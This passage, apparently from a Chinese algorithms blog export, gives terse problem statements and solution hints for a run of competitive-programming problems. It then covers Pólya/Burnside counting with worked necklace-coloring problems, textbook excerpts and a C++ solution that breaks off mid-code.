$K$ 次询问，第 $i$ 次询问第 $s_i$ 个 self-number，数据保证询问的 self-number 在 $[1,N]$ 中。 分析 110 Dundeon 题意 给 $1\\le N\\le 50$ 个三维空间中的球体以及一道激光，球体表面会发射激光。求前 10 个反射激光的球体编号。数据保证激光源在球体外部。 分析 111 Very simple problem 题意 给定数 $1\\le X\\le 10^{1000}$，求最大整数 $n$ 满足 $n^2\\le X$。 分析 112 $a^b-b^a$ 题意 给定数 $1\\le a, b\\le 100$，求出 $a^b-b^a$。 分析 113 Nearly prime numbers 题意 给定 10 个不超过 $10^9$ 的数，判断每个数是否能拆分两个质数之积，即 $n=p_1\\times p_2$，其中 $p_1,p_2$ 是质数。 分析 根据题意，只需找出 $n$ 的一个约数 $f_1$，则另一个约数即为 $n/f_1$，判断两个约数是否为质数即可，总的时间复杂度 $O(\\sqrt n)$。 114 Telecasting station 题意 一维数轴上有 $1\\le N\\le 1.5\\times 10^4$ 个城镇， 城镇坐标为 $0\\lt X_i \\lt 5\\times 10^4$，其人口数为 $0\\lt P_i \\lt 5\\times 10^4$。现要修建一电视站 $Y$，使得居民的不满程度 $\\sum_i P_i|X_i-Y|$ 最小。 分析 带权中位数经典题。 115 Calendar 题意 输入 2001 年 $M$ 月 $N$ 日，输出该天是周几？ 分析 模拟。 116 Index of super-prime 题意 定义素数序列为 $P_1\\lt P_2\\lt \\dots\\lt P_m\\lt\\dots$，超素数为素数序列中下标也是素数的数，例如3 的下标是 2，7 的下标是 4，因此 3 是超素数，7 不是超素数。现给定一正整数 $N\\le 10^4$，将 $N$ 分解成最少数量的超素数之和，并将超素数从大到小输出。若 $N$ 无法由超素数之和表示，则输出 0。 分析 现将 $N$ 以内的素数筛选出来，进一步筛选出超素数，个数约 200 个。剩下的问题为完全背包问题，动态规划解决即可。 117 Counting 题意 给定三个整数 $0\\lt N, M, K \\lt 10001$，询问 $N$ 次：判断给定的数 $x_i^M$ 是否是 $K$ 的倍数。 分析 快速幂。 118 Digital root 题意 求 $A_1+A_1A_2+\\dots+A_1A_2\\dots A_N$ 的数根，其中 $1\\le N\\le 1000,0\\le A_i\\le 10^9$。 分析 数根公式： DigitRoot(x)=\\begin{cases} 0, & \\text{if $n = 0$} \\\\[2ex] 9, & \\text{if $n \\neq 0 , n \\equiv 0 \\pmod 9$} \\\\[2ex] n \\mod 9, & \\text{if $n \\not \\equiv 0 \\pmod 9$} \\end{cases}原理 数 $x$ 可表示成 x=\\sum_i a_i10^i\\tag 1因为 $10^i \\equiv 1\\pmod 9$，所以有如下等式： x\\equiv \\sum_i a_i\\pmod 9\\tag 2定义数位和函数 $f(x)=\\sum a_i$，则等式 2 可写成： f(x)\\equiv x \\pmod 9 \\tag 3数根 $DigitRoot(x)$ 使用 $f(x)$ 表示为： DigitRoot(x)=f(f(\\dots f(x))) \\tag 4根据等式 3 可得 DigitRoot(x) \\equiv x\\pmod 9\\tag 5 119 Magic pairs 题意 给定三个正整数 $N, A_0,B_0\\le 10^4$，求出所有的 $0\\le A, B\\lt N$ 对，满足：对于所有的 $(x, y)$，如果 $A_0x+B_0y$ 能被 $N$ 整除，则 $Ax+By$ 也能被 $N$ 整除。 分析 根据题意可得 A_0x+B_0y=K_0N\\tag 1 Ax+By=KN\\tag 2联立公式 1 和公式 2 可得 (A_0B-AB_0)x=(BK_0-B_0K)N \\tag 3两边同时对 $N$ 取模 (A_0B-AB_0)x\\equiv 0\\pmod N \\tag 4该等式对于所有的 $x$ 均成立，即与 $x$ 无关，所以 A_0B-AB_0\\equiv 0\\pmod N \\tag 5根据公式 5 可知 $A:B$ 值等于 $A_0：B_0$，这缩小了解的搜索范围。然而这只说明了必要性，还需要进一步证明充分性。 利用扩展欧几里得定理，可求得 A_0x_0+B_0y_0=\\gcd(A_0, B_0) \\tag 6要使右式为 $N$ 的倍数，可两边同时乘上 $ N / \\gcd(\\gcd(A_0, B_0), N)$ A_0X_0+B_0Y_0=\\frac{\\gcd(A_0, B_0)}{\\gcd(\\gcd(A_0, B_0), N)} N \\tag 7其中，$X_0=x_0N / \\gcd(\\gcd(A_0, B_0), N)$，$Y_0=y_0N / \\gcd(\\gcd(A_0, B_0), N)$。 等式两侧同时除以 $\\frac{\\gcd(A_0, B_0)}{\\gcd(\\gcd(A_0, B_0), N)}$ AX_0+BY_0=N\\tag 8其中，$A=A_0\\frac{\\gcd(\\gcd(A_0, B_0), N)}{\\gcd(A_0, B_0)},B=B_0\\frac{\\gcd(\\gcd(A_0, B_0), N)}{\\gcd(A_0, B_0)}$。 上述过程可将 $X_0, Y_0$ 替换成通解形式，结论仍然成立。 则 $\\forall i\\in [0, N)$, $(iA\\mod N, iB\\mod N)$ 均是解，但是可能存在重复。 120 Archipelago 题意 给出正 $3\\le N\\le 150$ 边形的第 $N_1$ 个点坐标和第 $N_2$ 个点坐标，按序求出所有点的坐标。 分析 121 Bridges painting 题意 给点数为 $1\\le N\\le 100$ 的无向图，给图中的每条边进行黑白染色，要求当顶点度数大于 1 时，该顶点至少与一条白边和一条黑边相连接。 分析 122 The book 题意 给点数为 $2\\le N\\le 10^3$ 的无向图，每个点至少与 $[\\frac {N+1}{2}]$ 个点相连，求一条哈密顿回路。 分析 123 The sum 题意 求前 40 个斐波那契值的和。 分析 模拟。 124 Broken line 题意 给一边数为 $4\\le K\\le 10^4$ 的多边形，以及一个二维坐标点 $(X_0, Y_0)$，判断该点在多边形的内部、外部亦或边界上。数据保证多边形顶点坐标为整数，$X_0, Y_0$ 也为整数。 分析 125 Shtirlits 题意 分析 126 Boxes 题意 有两个盒子，两个盒子分别有 $A,B$ 个球，在移动球时要放入盒中已有的等量的球，即操作一次后两个盒子的球数可能为 $2A, B-A$ 或 $A -B, 2B$ 两种情况。求最少的操作次数使得一个盒子为空。数据保证 $0\\lt A+B\\lt 2147483648$。 分析 考虑反向操作，记 $S=A+B$，则判断状态 $(0, S)$ 是否能导出 $(A, B)$。逆操作从状态 $(A, B)$ 可推出 $(\\frac A2, B+\\frac A2)$。 因为总和固定为 $S$，对于一个状态可以用两者的最小值表示，则状态有 0→\\frac S2→\\frac S4→\\frac S8,\\frac {3S}8→\\frac {S}{16},\\frac {3S}{16},\\frac {5S}{16},\\frac {7S}{16}→\\dots可以发现有效状态构成了一棵高度最大为 $\\log(S)$ 的二叉树。反过来考虑，对于任一有效状态转移到根状态 $(0, S)$ 的操作数不超过 $\\log(S)$。因此对于初始状态 $(A, B)$ 在 32 步内判断是否根状态 $(0, S)$ 即可。 127 Telephone directory 题意 给 $0\\lt N\\lt 8000$ 个号码，电话本每页能记录 $0\\lt K \\lt 255$ 个电话号码，要求号码按序记录在电话本上，并且首位不同的号码记录记录在不同页，要求计算记录号码的页数。 分析 模拟。 128 Snake 题意 给定 $4\\le N\\le 10^4$ 个整点 $-10^4\\le x_i,y_i\\le 10^4$，要求构造满足以下条件的多边形： $N$ 个点均为多边形的顶点； 每个顶点均构成一个直角； 多边形的边与坐标轴平行； 多边形无自交； 多边形的周长最短。 如果能构成多边形，则输出多边形的周长，否则输出 0。 分析 考虑 $y$ 坐标相同的若干个点 $(x_1, y), (x_2, y),\\dots, (x_m, y)$。因为每个点连接一水平线段和一竖直线段，所以第一个点 $(x_1, y)$ 只能与 $(x_2, y)$ 相连，$(x_3, y)$ 与 $(x_4, y)$ 相连，以此类推。这要求 $m$ 必须是偶数，否则无解。 上述步骤完成后，需要判断所有点是否联通以及是否存在线段相交。对于线段相交问题，可以使用扫描线+线段树/树状数组解决。 129 Inheritance 题意 给有 $3\\le N \\le 400$ 个点的凸包，以及 $2\\le M\\le 1000$ 条线段，判断每条线段被凸包包含的长度。 分析 130 Circle 题意 圆上有 $2k$ 个点，其中 $1\\le k \\le 30$。现要求将点用线连接起来，使得：每个点都有线连接；圆被划分的区域数量最少，求不同的划分方案数以及最小区域数。 分析 显然，最少区域为 $k+1$，每条连线不能有交点，根据该性质则连一条边后就生成两个子问题，于是使用动态规划解决。$dp(i)$ 表示 $2i$ 个点划分成最少区域的方案数，枚举该连线的左右两部分的规模进行转移： dp(i)=\\sum_{j=0}^{i-1}dp(j)\\times dp(i-1-j) 131 Hardwood floor 题意 有一个 $N\\times M$ 的网格，现使用 1×2 和 2×2 的方块填满网格（方块可旋转放置），求铺满网格的方案数，其中 $1\\le N,M\\le 9$。 分析 状压 DP。 132 Another Chocolate Maniac 题意 给定 $M\\times N$ 的网格，使用 1×2 和 2×1 的方块填充，其中 $1\\le M\\le 70, 1\\le N\\le 7$。网格部分格子不能与方块重叠，求使用最少数量的方块填充网格，使得网格不存在相邻的空白格子，即不能再放置方块。 分析 轮廓线 DP。对于每个格子有 3 种状态：可放置、不可放置，必须放置。假设当前格子为 $(i, j)$ 且为空，上方的格子 $(i-1,j)$ 也为空，此时有两种方案：1. 在 $(i-1,j)$ 和 $(i, j)$ 中放方块；2. 不放方块，但是 $(i, j)$ 和 $(i+1,j)$ 必须放置方块。因此每个格子有 3 种状态，总的时间复杂度为 $O(NM3^N)$。 133 Border 题意 给 $1\\le N\\le 16000$ 个一维区间 $[A_i, B_i]$。若一个区间 $[A_i, B_i]$ 被另一个区间 $[A_j, B_j]$ 完全覆盖，即 $A_j\\lt A_i$ 且 $B_i \\lt B_j$，则去除该区间。求被去除区间的数量。 分析 按 $A_i$ 为第一关键字，$B_i$ 为第二关键字排序，按 $A_i$ 划分阶段，实时维护最大 $B_j$，若 $B_i&lt;B_j$ 则去除当前区间。 134 Centroid 题意 求树的重心。 分析 遍历一遍树即可。 135 Drawing Lines 题意 在无限平面上画 $N$ 条直线，求平面划分的区域数。 分析 画图找规律，直线两两相交，结论为 $1+\\frac {N(N+1)}2$。 136 Erasing Edges 题意 给定 $3\\le N \\le 10^4$ 点多边形的边的中点 $(x_i, y_i)$，判断是否能够根据边中点复原多边形顶点，如果能复原按序给出顶点坐标。 分析 138 Games of Chess 题意 有 $2\\le N \\le 100$ 个人轮流下象棋，每次两个人下棋并且胜者可继续下棋直至输棋。现已知每个人下棋的总局数，要求构造符合规则的一种方案，其胜者在第一个。数据保证有解，且所有人的总局数小于 $10^4$。 分析 构造。总棋局数为每个人的总局数之和除以二。然后按每个人的局数从大到小排序，假设顺序为 $(r_1, c_1), (r_2, c_2),\\dots$，其中 $r_i$ 表示 $id = c_i$ 的棋局数。构造方案为 $(c_1, ?),(c_1,?),\\dots,(c_2, c1),(c_2,?),\\dots$，优先排列胜者，最后一局输给下一个胜者完成衔接，剩余的棋手则安排在败者局中。 139 Help Needed! 题意 十五数码问题。 分析 140 Integer Sequences 题意 给定长为 $1\\le N \\le 100$ 的序列 $0\\le A_i\\le 2\\times 10^9$，判断是否存在序列 $X_i$ 满足 \\sum A_iX_i \\equiv B \\pmod P其中， $0\\le B\\lt P\\le 10^4$。 分析 扩展欧几里得算法。 141 Jumping Joe 题意 一只青蛙在一维数轴的整数点上跳，每次能够向负轴或正轴方向跳 $x_1$ 或 $x_2$ 个整数距离，求能否刚好 $0\\le K\\le 2\\times 10^9$ 次跳到整点 $-4\\times 10^4 \\lt P\\lt 4\\times 10^4$ 位置上。如果能到达位置 $P$，给出一种方案 $(P_1, N_1, P_2, N_2)$，$P_i$ 表示往正轴方向跳 $x_i$ ，$N_i$ 则表示往负轴方向跳 $x_i$。 分析 扩展欧几里得算法。 142 Keyword 题意 给长为 $1\\le N \\le 5\\times 10^5$ 的字符串，该串只由 $a$ 和 $b$ 构成，求最短的不是该串子串的字符串，并给出一个解。如 $aba$ 的子串有 $a,b,ab,ba,aba$，因此最短非子串长度为 2，一种解为 $aa$。 分析 因为 $2^{19} &gt; 5\\times 10^5$，所以答案不超过 19，枚举长度并枚举该长度所有子串即可。后缀数组和后缀自动机也可以做。 145 Long Live the Queen 题意 给定有 $1\\le N \\le 16\\times 10^4$ 的树，每个点的权值为 $-10^3\\le w_i\\le 10^3$，求一棵子树使得权重和最大。 分析 树 DP。 144 Meeting 题意 两个人约在 $[X,Y]$ 时间内碰面，约定先到的人等另一个人的时间不超过 $0\\lt Z\\le 60*(Y-X)$ 分钟，求两个人能碰面的概率。 分析 。 148 B-Station 题意 背景中有 $1\\le N\\le 15000$ 级蓄水池，每级蓄水池目前有 $0\\le W_i\\le 15000$ 重的水量，最大蓄水量为 $0\\le L_i\\le 15000$。释放第 $i$ 级蓄水池的代价为 $0\\le P_i \\le 15000$，且第 $i$ 级的水会流入第 $i+1$ 级的水池中。如果水池中的水超过了容量，则水池中的所有水会继续流入下一级。现在 kbfz 想要释放第 $N$ 级的水，求最小代价以及一种方案。 分析 为了释放第 $N$ 级的水，一种是直接花费 $P_N$ 的代价，另一种则是释放前面的水池，通过超容量来释放。假设第一个花费代价 $P_j$ 释放水池 $j$，则下一个必须花费代价的水池满足： \\sum_{i=j}^k W_i \\le L_k即堆积的总水量不超过容量的第一个位置 $k$，该位置必须花费 $P_k$ 的代价释放水。 使用前缀和 $S_i$ 表示，则有 S_k-S_{j-1}\\le L_k \\\\ \\Rightarrow S_k-L_k\\le S_{j-1}当固定第一个花钱释放的水池 $j$ 后，在 $[j, N]$ 中必须花钱的水池满足 $S_k-L_k \\le S_{j-1}$，其中 $S_k-L_k$ 是定值。之后使用数据结构维护 $S_k-L_k$ 所对应的代价即可。 149 Computer Network 题意 给 $1\\le N\\le 10^4$ 个点的树，求每个点 $i$ 到其他点的最远距离 $S_i$。 分析 每个点到树直径的端点的距离之一等于最远距离。 150 Mr. Beetle II 题意 给定起点 $(x_1, y_1)$ 和终点 $(x_2, y_2)$，求起点和终点构成的线段穿过的第 $1\\le n\\le 10^5$ 个格子左下角坐标，只经过角点不算穿越该格子。每个格子可使用 $(x, y),(x,y+1),(x+1,y+1),(x+1, y)$ 表示，其中左下角点坐标为 $(x, y)$。 分析 假设已知当前穿越的格子，则下一个可能穿越的格子为前进方向的相邻 3 个格子。线段穿越格子的充要条件：线段和格子的其中一条对角线严格相交。 !!! 151 Construct a triangle 题意 对于三角形 ABC，已知长度 $|AB|=c,|AC|=b,|AM|=m$，其中 M​ 是线段 BC 的中点。求三个顶点的坐标，满足上述长度关系。 这道题数据有问题，允许三点共线。 分析 固定点 A 在原点，点 B 为 $(c, 0)$，设点 C 坐标为 $(x, y)$。根据长度关系可得： x^2+y^2=b^2 \\\\ (x+c)^2+y^2=4m^2利用这个等式可以很容易求出一组解，注意判断方程有解即可。 152 Making round 题意 已知 $1\\le N\\le 10^4$ 候选人的选票数 $0\\le A_i\\le 10^4$，现要求将选票转换成整数的百分比形式， 使得总和为 100。对于转换后小数部分，每个候选人的选票可向上或向下取整（取整相互独立）。求一种方案，或判断无法转换。 分析 模拟。 xxx 题意 分析","categories":[],"tags":[]},{"title":"Pólya计数法","slug":"polya","date":"2019-10-31T11:54:39.000Z","updated":"2019-11-08T12:00:45.000Z","comments":true,"path":"2019/10/31/polya/","link":"","permalink":"http://mcginn7.github.io/2019/10/31/polya/","excerpt":"","text":"题目Necklace of Beads来源 POJ 1286 题意 使用 RGB 三种颜色对长为 $0\\le n\\le 23$ 的项链染色，求本质不同的方案数。一种方案如果经过旋转或翻转得到另一种方案，两种方案视为同一种。 注意 $n=0$ 在本题中会出现，测试数据输出 0。 分析 使用 Polya 计数公式求解，即对于正 $n$ 边形的顶点对称群 \\{ρ_n^0=\\iota,ρ_n,\\dots, ρ_n^{n-1}, τ_1, τ_2, \\dots, τ_n \\}的循环因子分解。 旋转置换 $ρ_n^i,i=0,1,\\dots n-1$ 的循环个数为 \\gcd(n, i)证明 旋转置换中的每个元素在一个有向圈 $s+ki=s(\\%\\ n)$ ，其中 $k$ 是最小正整数。那么 $n|ki$，令 $ki=lcm(n, i)=ni/\\gcd(n, i)$，则 $k=n/\\gcd(n, i)$。所以有向圈的长度为 $n/\\gcd(n, i)$，个数为 $n/k=\\gcd(n,i)$ 个。 根据定理 3 可得， |C(ρ_n^i)|=3^{\\gcd(n, i)} 反射置换 $τ_i$ 需要根据 $n$ 的奇偶性考虑。 当 $n$ 为奇数时，有 $n$ 个关于角点与其对边中点的连线的反射，每个反射置换的型为 (1, \\frac{n-1}{2}, 0, \\dots, 0)根据定理 3 可得 |C(τ_i)|=3^{\\frac{n+1}{2}}当 $n$ 为偶数时，有 $n/2$ 个关于对角点的反射和 $n/2$ 个关于对边中点连线的反射，两种置换的型分别为 (2, \\frac n2-1, 0, \\dots, 0)\\\\ (0, \\frac n 2, 0, \\dots, 0)根据置换的型和定理 3 可求得 $|C(f)|$，最后使用 Burnside 定理即可求解不同着色的方案数。 Color来源 POJ 2154，LG 4980 题意 给定长为 $N\\le 10^9$ 的项链，使用至多 $N$ 种颜色对项链上的珠子着色，考虑在旋转条件下的不同着色方案数，结果对 $1\\le P \\le 3\\times 10^4$ 取模。 分析 旋转置换 $ρ_n^i,i=0,1,\\dots n-1$ 的循环个数为 \\gcd(n, i)根据 Polya 定理，总方案数为 Answer = \\frac 1 n \\sum_{0\\le i \\lt n} |C(\\rho_n^i)| = \\frac 1 n \\sum_{0\\le i \\lt n} n^{\\gcd(n, i)} \\\\ = \\frac 1 n \\sum_{d|n}n^d\\sum_{0\\le i \\lt n}[\\gcd(n, i) =d] \\\\ = \\frac 1 n \\sum_{d|n}n^d\\sum_{0\\le i \\lt n}[\\gcd(n/d, i/d) =1] \\\\ = \\frac 1 n \\sum_{d|n}n^d\\sum_{0\\le i \\lt n/d}[\\gcd(n/d, i) =1] \\\\ = \\frac 1 n \\sum_{d|n}n^d\\phi(n/d) = \\sum_{d|n}n^{d-1}\\phi(n/d) \\\\$O(\\sqrt n)$ 枚举 $n$ 的所有约数 $d$（因为前 10 个质数乘积大于 $10^9$，因此约数个数最多只有 $2^{10}=1024$ 个），快速幂求 $n^{d-1}$，$O(\\sqrt {n/d})$ 求 $\\phi(n/d)$。 Magic Bracelet来源 POJ 2888 题意 给定长为 $1\\le n \\le 10^9$ 的项链，使用 $1\\le m \\le 10$ 种颜色对项链上的珠子着色，考虑旋转同构的不同着色方案数，结果对 9973 取模。此外，限制部分颜色对不能着色于相邻的珠子上。数据保证 $gcd(n, 9973)=1$。 分析 已知循环置换 $ρ_n^i$ 的循环个数为 $\\gcd(n, i)$。对于一个循环圈可表示为 $j+ki(\\mod n)$，则在同一个循环的元素 $x, y$ 要满足 $x \\mod \\gcd(n, i) = y \\mod \\gcd(n, i)$，即循环节大小为 $\\gcd(n, i)$。因为相邻珠子不能着限制颜色对，此时保证前 $\\gcd(n, i) + 1$ 个元素不出现禁止的颜色对即可，问题转化成求解 $k$ 个珠子的项链不出现禁止颜色对的方案数。 转化后的问题可以使用动态规划解决，$dp(i, j)$ 表示前 $i$ 个元素中最后一个元素的颜色为 $j$ 的方案数。记不能相邻的颜色对集合为 $E$，则转移方程为 dp(i, j) = \\sum_{(k,j)\\notin E}dp(i-1,k)由于 $n$ 很大而 $m$ 很小，因此可以使用矩阵 + 快速幂解决。另一方面，项链首尾相接的问题可以通过枚举第一个元素的颜色解决。 Birthday Toy来源 HDU 2865 题意 使用 $4\\le k \\le 10^9$ 种颜色对形如图 1的项链着色，项链包括 $3\\le N \\le 10^9$ 个小珠子以及一个中心的大珠子。要求相邻珠子不能同色，求旋转同构的不同着色方案数，结果对 $10^9+7$ 取模。 图 1. 特殊形状的项链分析 由于中心点的大珠子与所有小珠子均相邻，因此可从 $k$ 种颜色中先选一种颜色对大珠子着色，使得问题转化为使用 $k-1$ 种颜色对普通项链着色。 进而本问题与 POJ 2888 Magic Bracelet 类似，问题进一步转化成长为 $L$ 的项链相邻珠子不同构的着色方案数。使用动态规划思想解决，$dp(i, j)$ 表示前 $i$ 个珠子最后一个颜色为 $j$ 的方案数，转移方程为 dp(i, j) = \\sum_k{dp(i-1,k)} - dp(i-1, j)项链需要解决首尾相接问题，此时通过 $O(k)$ 枚举第一个元素的颜色解决。由于颜色数 $k$ 很大，因此不能使用线性递推的动态规划做法。 在枚举第一个元素的颜色时，不失一般性，假设第一个元素的颜色为 1，那么颜色 2,…,k 是等价的。可以理解为只用 2 种颜色着色，只是第 2 种颜色有 $k - 1$ 种替换， ​因此动态规划的状态只有 $dp(i, 1)$ 和 $dp(i, c), c=2,\\dots, k$，因此转移方程可写成 dp(i, 1) = dp(i-1, 1)+(k-1)dp(i, c) - dp(i-1,1) \\\\ dp(i, c) = dp(i-1,1)+(k-1)dp(i, c)-dp(i-1,c) = dp(i-1,1)+(k-2)dp(i-2,c)写成矩阵形式 \\begin{pmatrix} 0&k-1\\\\ 1&k-2 \\end{pmatrix} \\begin{pmatrix} dp(i-1,1)\\\\ dp(i-1,c) \\end{pmatrix} = \\begin{pmatrix} dp(i,1)\\\\ dp(i,c) \\end{pmatrix}使用快速幂优优化计划 $dp(i, 1)$，进而方案数为 Answer = \\frac 1 n \\sum_{d|n} dp(d, 1)φ(n / d)《组合数学》摘录置换群与对称群置换定义 设 $X$ 是一个有限集 $\\{1, 2, \\dots , n\\}$，$X$ 的每个置换 $f$ f(1)=i_1, f(2)=i_2, \\dots , f(n)=i_n可视为到其自身定义的一对一函数 $f:X\\rightarrow X$，用 $2\\times n $ 阵列表示： \\begin{pmatrix} 1&2&\\dots&n\\\\ i_1&i_2&\\dots&i_n \\end{pmatrix} \\tag1将 $\\{1, 2, \\dots, n\\}$ 的所有 $n!$ 个置换构成的集合记为 $S_n$。 运算 置换的合成运算“$\\circ$”满足结合律，但不满足交换律： (f\\circ g)\\circ h=f\\circ(g\\circ h) \\tag 2恒等置换 各数对应到自身的置换 $\\iota$： \\iota = \\begin{pmatrix} 1&2&\\dots&n \\\\ 1&2&\\dots&n \\\\ \\end{pmatrix} \\tag 3逆函数 如果 $f(s)=k$，那么 $f^{-1}(k)=s$。 置换群定义 若 $S_n$ 的非空子集 $G$ 为 $X$ 的一个置换群，则满足： $\\forall f, g\\in G, f\\circ g \\in G$，即合成运算的封闭性。 恒等置换 $\\iota \\in G$，即包含单位元。 $\\forall f \\in G，f^{-1}\\in G$，即逆元的封闭性。 特殊 $X=\\{1, 2, \\dots, n\\}$ 的所有置换的集合 $S_n$ 是一个置换群，记为 $n$ 阶对称群。集合 $G=\\{\\iota\\}$ 也是一个置换群。 性质 置换群满足消去律：若 $f\\circ g=f\\circ h$，那么 $g=h$。 Burnside定理计算集合 $X$ 的不等价着色数。 设 $G$ 是 $X$ 的一个置换群，$C$ 是一个着色集合，使着色 $c$ 保持不变的集合： G(c)=\\{f:f\\in G, f*c=c\\} \\tag{4}集合 $G(c)$ 称为 $c$ 的稳定核，任何着色的稳定核是一个置换群。 在 $f$ 作用下使着色 $c$ 保持不变的 $G$ 中所有着色的集合： C(f)=\\{c:c\\in C, f*c=c\\} \\tag 5定理1 对于每一种着色 $c$，$c$ 的稳定核 $G(c)$ 是一个置换群，且对 $G$ 中任意置换 $f$ 与 $g$，$gc=fc$当且仅当 $f^{-1}\\circ g$ 属于 $G(c)$。 推论1 设 $c$ 为 $C$ 中的一种着色，那么与 $c$ 等价的着色数等于 $G$ 中的置换个数除以 $c$ 的稳定核中的置换个数 |\\{f*c:f\\in G\\}|=\\frac{|G|}{|G(c)|} \\tag 6证明 对于 $h\\in G(c)$，有 $(f\\circ h)c=f(hc)=fc$，从而对于每个置换 $f$，恰好存在 $|G(c)|$ 个置换，这些置换作用在 $c$ 上跟 $f$ 有同样的效果。 定理2 设 $G$ 是 $X$ 的一个置换群，$C$ 是 $X$ 的一个着色集并且使得对于 $G$ 中的任意 $f$ 与 $C$ 中的任意 $c$，$f*c\\in C$，则 $C$ 中不等价的着色数 $N(G, C)$ 为 N(G, C)=\\frac1 {|G|} \\sum_{f\\in G}|C(f)| \\tag 7换言之，$C$ 中不等价的着色数等于使着色通过 $G$ 中的置换保持不变的着色的平均数。 证明 计数 $f*c=c$ 的对偶 $(f, c)$ 的个数，使用两种不同的方式计数，然后使计数相等。 一种从置换 $f$ 考察，根据定义计数结果为 \\sum_{f\\in G} |C(f)| \\tag 8一种从着色 $c$ 考察，每个 $c$ 对结果的贡献为 |G(c)|=\\frac{|G|}{(与 c 等价的着色数)} \\tag 9计数结果为 \\sum_{c \\in C} \\frac{|G|}{(与c等价的着色数)} \\tag {10}按等价类将着色归类，每个等价类的总贡献为 $|G|$，等价类的个数就是不等价类的着色数 $N(G, C)$，因此公式(10) 等于 N(G,C)\\times |G| \\tag {11}联立公式(8) 和公式(11) 得到 \\sum_{f\\in G}|C(f)|=N(G, C)\\times |G| \\tag {12}Pólya计数公式通过考虑置换的循环结构，计算可变得容易简便。 设 $f$ 是 $X=\\{1, 2, \\dots, n\\}$ 的一个置换，$D_f=(X, A_f)$ 是顶点集为 $X$ 且弧集为 A_f = \\{(i, f(i)):i\\in X\\}的有向图。该有向图有 $n$ 个顶点与 $n$ 条弧，各顶点的入度和出度等于1，因此弧集 $A_f$ 被划分为若干个有向圈，且每个顶点恰好只属于一个有向圈。 如果某些元素以循环的方式被置换且余下元素保持不变，那么称这样的置换为循环置换或简称循环。如果循环中的元素个数为 $k$，则称它为 $k-$循环。 设 $f$ 是集合 $X$ 的任意置换，关于合成运算 $f$ 有化成循环的因子分解 f=[i_1\\ i_2\\ \\dots\\ i_p]\\circ[j_1\\ j_2\\ \\dots\\ j_q]\\circ\\dots\\circ[l_1\\ l_2\\ \\dots\\ l_r] \\tag {13}公式(13) 称为 $f$ 循环因子分解。 对于 $f$ 分解中的每个循环，该循环中的所有元素着色相同，因此着色方案数与循环阶数无关，而与循环个数有关。置换 $f$ 的循环因子分解中的循环个数记为 \\#(f)定理3 设 $f$ 是集合 $X$ 的一个置换，假如用 $k$ 种颜色对 $X$ 的元素进行着色，令 $C$ 是 $X$ 的所有着色的集合，则 $f$ 保持 $C$ 中着色不变的着色数为 |C(f)|=k^{\\#(f)}假设 $f$ 的循环因子分解有 $e_i$ 个 $i$-循环，因 $X$ 的各元素在 $f$ 循环因子分解中恰好出现在一个训话中，所以 $e_i$ 是非负整数且满足 \\sum_{i=1}^{n}ie_i=n \\tag {14}称 $n$ 元组 $(e_1, e_2, \\dots, e_n)$ 是置换 $f$ 的型，记为 type(f)=(e_1, e_2, \\dots, e_n)循环数为 \\#(f)=e_1+e_2+\\dots+e_n因为置换的型仅取决于循环因子分解中循环的阶数，所以不同置换可以有相同的型，我们可引进 $n$ 个不定元 z_1, z_2, \\dots, z_n其中，$z_k$ 对应一个 $k$ 阶循环（$k=1, 2, \\dots, n$）。对于具有 $type(f)=(e_1, e_2, \\dots, e_n)$ 的每个置换 $f$，定义 $f$ 的单项式为 mon(f)=z_1^{e_1}z_2^{e_2}\\dots z_n^{e_n}设 $G$ 是 $X$ 的一个置换群。对 $G$ 中每个置换 $f$ 的单项式求和，得到关于 $G$ 中的置换按照型的生成函数 \\sum_{f\\in G} mon(f)=\\sum_{f\\in G}z_1^{e_1}z_2^{e_2}\\dots z_n^{e_n} \\tag{15}合并公式(15) 中的同类型，$z_1^{e_1}z_2^{e_2}\\dots z_n^{e_n}$ 的系数等于型为 $(e_1, e_2,\\dots, e_n)$ 的 $G$ 中的置换个数。 $G$ 的循环指数定义为该生成函数除以 $G$ 中的置换个数 $G$，即 P_G(z_1, z_2, \\dots , z_n) = \\frac 1 {|G|} \\sum_{f\\in G} z_1^{e_1}z_2^{e_2}\\dots z_n^{e_n}定理4 设 $X$ 是有 $n$ 个元素的一个集合，假设有 $k$ 种可用的颜色集可用来对 $X$ 的元素进行着色。令 $C$ 是 $X$ 的所有 $k^n$ 种着色的集合，$G$ 是 $X$ 的一个置换群。则不等价的着色数是用 $z_i=k(i=1,2,\\dots, n)$ 带入 $G$ 的循环指数中而得到的数，即 N(G,C)=P_G(k,k,\\dots, k)定理5（Polya定理） 设 $X$ 是一个元素集合，$G$ 是 $X$ 的一个置换群，$\\{u_1, u_2, \\dots, u_k\\}$ 是 $k$ 种颜色的一个集合，$C$ 是 $X$ 的任意着色集并且 $G$ 为 $C$ 上的一个置换群，那么根据各颜色的数目，$C$ 的不等价着色数的生成函数是由循环指数 $P_G(z_1, z_2, \\dots, z_n)$ 通过做变量代换 z_j=u_1^j+\\dots+u_k^j\\ (j=1, 2, \\dots, n)而得到的表达式 P_G(u_1+\\dots+u_k, u_1^2+\\dots+u_k^2,\\dots, u_1^n+\\dots+u_k^n) \\tag{16}换言之，公式(16) 中 u_1^{p_1}u_2^{p_2}\\dots u_k^{p_k}的系数等于 $X$ 中的 $p_i$ 个元素着颜色 $u_i$ 的 $C$ 中不等价的着色数。 参考代码Necklace of Beads12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758#include&lt;cstdio&gt;#include&lt;cstring&gt;#include&lt;algorithm&gt;#include&lt;iostream&gt;#include&lt;vector&gt;#include&lt;queue&gt;#include&lt;set&gt;#include&lt;map&gt;using namespace std;typedef double db;typedef long long ll;typedef vector&lt;int&gt; vi;typedef pair&lt;int, int&gt; pii;#define fi first#define se second#define pb push_back#define mp make_pair#define sz(x) ((int)(x).size())#define all(x) begin(x),end(x)#define rep(i,l,r) for(int i=(l);i&lt;(r);++i)#define per(i,l,r) for(int i=(r)-1;i&gt;=(l);--i)#define dd(x) cout &lt;&lt; #x &lt;&lt; \"=\" &lt;&lt; x &lt;&lt; \", \"#define de(x) cout &lt;&lt; #x &lt;&lt; \"=\" &lt;&lt; x &lt;&lt; endl//-------inline int __gcd(int x, int y) &#123; return !x ? y : __gcd(y % x, x); &#125;ll kpow(ll a, ll b) &#123; ll r = 1; while (b &gt; 0) &#123; if (b &amp; 1) r = r * a; a = a * a, b &gt;&gt;= 1; &#125; return r;&#125;int main() &#123; int n; while (~scanf(\"%d\", &amp;n) &amp;&amp; ~n) &#123; if (n == 0) &#123; puts(\"0\"); continue; &#125; ll ans = 0; // rotation rep(i, 0, n) &#123; ll circ = __gcd(n, i); ans += kpow(3, circ); &#125; // 